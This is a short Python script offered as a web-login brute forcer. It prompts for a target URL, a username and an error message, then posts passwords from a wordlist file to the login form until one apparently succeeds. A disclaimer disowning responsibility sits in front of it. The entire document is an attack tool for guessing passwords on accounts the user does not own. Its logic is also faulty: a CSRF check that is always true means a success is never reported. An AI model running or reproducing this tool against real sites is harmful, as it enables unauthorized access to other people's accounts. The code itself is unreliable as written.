#brute forcer
import requests
import time
import sys
import getpass

print('''
 ██▓ ███▄    █   █████▒▒█████  ▄▄▄█████▓ ▄▄▄       ██ ▄█▀▓█████  ██▀███  
▓██▒ ██ ▀█   █ ▓██   ▒▒██▒  ██▒▓  ██▒ ▓▒▒████▄     ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██  ▀█ ██▒▒████ ░▒██░  ██▒▒ ▓██░ ▒░▒██  ▀█▄  ▓███▄░ ▒███   ▓██ ░▄█ ▒
░██░▓██▒  ▐▌██▒░▓█▒  ░▒██   ██░░ ▓██▓ ░ ░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██░▒██░   ▓██░░▒█░   ░ ████▓▒░  ▒██▒ ░  ▓█   ▓██▒▒██▒ █▄░▒████▒░██▓ ▒██▒
░▓  ░ ▒░   ▒ ▒  ▒ ░   ░ ▒░▒░▒░   ▒ ░░    ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░░ ░░   ░ ▒░ ░       ░ ▒ ▒░     ░      ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ▒ ░   ░   ░ ░  ░ ░   ░ ░ ░ ▒    ░        ░   ▒   ░ ░░ ░    ░     ░░   ░ 
 ░           ░            ░ ░                 ░  ░░  ░      ░  ░   ░     
                                By: 123xboxlookup                                         
                                ''')

def typingPrint(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    time.sleep(0.01)
  
def typingInput(text):
  for character in text:
    sys.stdout.write(character)
    sys.stdout.flush()
    time.sleep(0.01)
  value = input()  
  return value 

yes_no = ["yes", "no"]

typingPrint("DISCLAIMER!, Before you use this tool we, the creators, are not responsible for any actions performed with the use of this tool. ")
print("")

time.sleep(1)

response = ''
while response not in yes_no:
	response = typingInput("if you understand and have just read through the previous message please enter either yes or no: ")
print("")

if response == 'no':
	typingPrint("ok exiting now.")
	quit()
else:
	if response == 'yes':
		typingPrint("ok continuing please wait... ")
print("")

time.sleep(1)

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")


try: 
    def bruteCracking(username,url,error):
        count = 0
        for password in passwords:
            password = password.strip()
            count = count + 1
            print("Trying Password: "+ str(count) + ' Time For => ' + password)
            data_dict = {"LogInID": username,"Password":password, "Log In":"submit"}
            response = requests.post(url, data=data_dict)
            if error in str(response.content):
                pass
            elif "CSRF" or "csrf" in str(response.content):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("pass", "r") as passwords:
    bruteCracking(username,url,error)

print("[!!] password not in list")
